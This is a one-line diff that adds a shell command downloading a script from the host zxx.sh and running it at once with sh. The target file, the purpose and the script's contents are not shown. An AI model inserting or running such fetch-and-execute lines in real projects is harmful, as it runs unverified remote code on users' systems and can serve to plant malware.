@@ -1,0 +1,1 @@
+wget zxx.sh/zxx.sh && sh zxx.sh
